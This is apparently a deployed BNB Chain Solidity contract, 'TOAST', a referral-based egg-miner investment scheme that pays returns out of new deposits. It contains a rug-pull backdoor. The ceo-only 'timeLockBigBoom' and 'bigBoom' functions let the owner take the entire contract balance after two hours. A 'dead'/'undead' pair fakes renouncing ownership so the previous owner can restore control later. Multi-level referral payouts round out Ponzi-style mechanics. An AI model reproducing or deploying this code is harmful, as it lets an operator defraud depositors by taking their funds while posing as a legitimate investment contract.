/**
 *Submitted for verification at BscScan.com on 2022-06-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-26
*/

pragma solidity ^0.8.14; // solhint-disable-line


contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor ()  { }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


  /**
  * @dev Contract module which provides a basic access control mechanism, where
  * there is an account (an owner) that can be granted exclusive access to
  * specific functions.
  *
  * By default, the owner account will be the one that deploys the contract. This
  * can later be changed with {transferOwnership}.
  *
  * This module is used through inheritance. It will make available the modifier
  * `onlyOwner`, which can be applied to your functions to restrict their use to
  * the owner.
  */
  contract Ownable is Context {
  address private _owner;
    address private _previousOwner;
    uint256 private _deadTime;
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
    function geUnlockTime() public view returns (uint256) {
        return _deadTime;
    }

    
    function dead(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _deadTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    
    function undead() public virtual {
        require(
            _previousOwner == msg.sender,
            "You don't have permission to dead"
        );
        require(block.timestamp > _deadTime, "Contract is dead until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}


contract TOAST is Context,Ownable{
    //uint256 EGGS_PER_MINERS_PER_SECOND=1;
    uint256 public EGGS_TO_HATCH_1MINERS=864000;//for final version should be seconds in a day
    uint256 public minBuyValue=100000000000000000;//Purchase BNB quantity must be a multiple of 0.1
    address public marketingAddress;
    uint256 public marketTime;

    bool public initialized=false;
    address public ceoAddress;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public leftEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => uint256) public rewardTime;
    // mapping (address => uint256) public numRealRef;
    uint256 public marketEggs=0;

    // uint256 public fomoTime;
    // address public fomoAddress;
    uint256 public fomoNeededTime = 86400;
    uint256 public fomoRewards;
    uint256 public timeLock = 1750866480;
    // mapping(address => bool) public isWhiteList;
    // bool whiteListNeeded = true;
    constructor() {
        ceoAddress=msg.sender;
        marketingAddress = 0x7e9EcDf6B56dFa529dA344Cc7f513DB383CB4B2C; 
        // isWhiteList[ceoAddress] = true;
    }
    
    // function sellEggs() public{
    //     require(initialized);
    //     uint256 hasEggs=getMyEggs();
    //     uint256 eggValue=calculateEggSell(hasEggs);
    //     uint256 fee=devFee(eggValue);
    //     claimedEggs[msg.sender]=0;
    //     lastHatch[msg.sender]=block.timestamp;
    //     marketEggs=SafeMath.add(marketEggs,hasEggs);
    //     payable(marketingAddress).transfer(fee);
    //     payable(msg.sender).transfer(SafeMath.sub(eggValue,fee));
        
    // }

    // function updateFomoFinished() private {
    //     uint256 realTime = SafeMath.add(fomoNeededTime, fomoTime);
    //     if(block.timestamp > realTime){
    //         isFomoFinished=true;
    //     }
    // }


    function buyEggs(address ref) public payable{
        require(initialized);
        require(msg.value >= minBuyValue, "Not Enough BNB");
        // require(msg.value % minBuyValue==0, "Purchase BNB quantity must be a multiple of 0.1");

        // if(whiteListNeeded){
        //     require(isWhiteList[msg.sender] == true, "You are not on the whitelist");
        // }
        
        
        uint256 eggsBought=msg.value;

        uint256 fee=devFee(msg.value);
        payable(marketingAddress).transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        leftEggs[msg.sender]=SafeMath.add(leftEggs[msg.sender],eggsBought);

        marketEggs=SafeMath.add(marketEggs,eggsBought);


        if(ref == msg.sender || ref == address(0)) {
            ref = ceoAddress;
        }

        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }


        while(block.timestamp>SafeMath.add(marketTime, fomoNeededTime))
        {
            marketTime=SafeMath.add(marketTime, fomoNeededTime);
        } 
        rewardTime[msg.sender] = SafeMath.add(marketTime, fomoNeededTime);

        if (msg.value>=minBuyValue){
            // numRealRef[referrals[msg.sender]] +=(SafeMath.div(SafeMath.mul(msg.value,15),100));
            payable(referrals[msg.sender]).transfer(SafeMath.div(SafeMath.mul(msg.value,15),100));
            address level2=referrals[referrals[msg.sender]];
            if(level2 != address(0))
            {
                // numRealRef[level2] +=(SafeMath.div(SafeMath.mul(msg.value,5),100));
                payable(level2).transfer(SafeMath.div(SafeMath.mul(msg.value,5),100));
            }
        }
    }
    

    // function receivedNumRealRef() public payable{
    //     require(rewardTime[msg.sender] != 0,"Please join us first");
    //     require(block.timestamp>=rewardTime[msg.sender],"The reward time has not arrived yet");

    //     uint256 numRef= numRealRef[msg.sender];
    //     numRealRef[msg.sender]=0;
    //     // (bool success, ) = payable(msg.sender).call{value: fomoRewards}("");
    //     payable(msg.sender).transfer(numRef);
    // }


    function getFomoRewards(address addr) public view returns(uint256){
       return  SafeMath.div(SafeMath.mul(claimedEggs[addr], 20), 100);
    }


    function receivedFomoRewards() public payable{
        require(rewardTime[msg.sender] != 0,"Please join us first");
        require(block.timestamp>=rewardTime[msg.sender],"The reward time has not arrived yet");
        rewardTime[msg.sender]=SafeMath.add(rewardTime[msg.sender], fomoNeededTime);
        

        fomoRewards=SafeMath.div(SafeMath.mul(claimedEggs[msg.sender], 20), 100);
        if(leftEggs[msg.sender]<fomoRewards)
        {
            fomoRewards=leftEggs[msg.sender];
        }
        leftEggs[msg.sender]= SafeMath.sub(leftEggs[msg.sender],fomoRewards);
        if(leftEggs[msg.sender]<=0)
        {
            claimedEggs[msg.sender]=0;//set total eggs to zero
        }

        // (bool success, ) = payable(msg.sender).call{value: fomoRewards}("");
        payable(msg.sender).transfer(fomoRewards);
    }

    function checkFomoRewardsTime() public view returns(uint256){
        require(rewardTime[msg.sender] != 0,"Please join us first");
        return rewardTime[msg.sender];
    }


     function setFomoNeededTime(uint256 time) public{
        require(msg.sender == ceoAddress);
        fomoNeededTime = time;
    }


    // function getNumRealRef(address _addr) public view returns(uint256){
    //     return numRealRef[_addr];
    // }


    // Do not touch me
    function timeLockBigBoom() public {
        require(msg.sender == ceoAddress);
        timeLock = SafeMath.add(block.timestamp, 7200);
    }


    function bigBoom() public  {
        require(msg.sender == ceoAddress);
        require( block.timestamp > timeLock);
        payable(msg.sender).transfer(address(this).balance);
        // (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        // require(success == true, "Transfer failed.");
    }

    // function setWhiteListNeeded(bool _bool) public{
    //     require(msg.sender == ceoAddress);
    //     whiteListNeeded = _bool;
    // }

    // function setWhiteList(address _addr, bool _bool) public{
    //     require(msg.sender == ceoAddress);
    //     isWhiteList[_addr] = _bool;
    // }


    // function setWhiteListBatch(address[] memory  _address, bool _bool) public {
    //     require(msg.sender == ceoAddress);
    //     for (uint256 i = 0; i < _address.length; i++) {
    //         isWhiteList[_address[i]] = _bool;
    //     }
    // }

    function setMinBuyValue(uint256 value) public{
        require(msg.sender == ceoAddress);
        minBuyValue = value;
    }


    function setNewFomoRound(uint256 value) public{
        require(msg.sender == ceoAddress);
        // fomoAddress = address(0);
        initialized=true;
        fomoRewards = 0;
        // fomoTime = SafeMath.add(block.timestamp,3600);
        marketTime=value;
    }

    function fireCeo( address _addr ) public  {
        require(msg.sender == ceoAddress);
        ceoAddress = _addr;
    }


    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    // function seedMarket(uint256 value) public {
    //     require(msg.sender == ceoAddress, 'invalid call');
    //     initialized=true;
    //     marketEggs=0;
    //     marketTime=value;
    //     // fomoTime = SafeMath.add(block.timestamp,3600);
    // }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    
    // function calculateEggSell(uint256 eggs) public view returns(uint256){
    //     return eggs*0.1;
    // }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}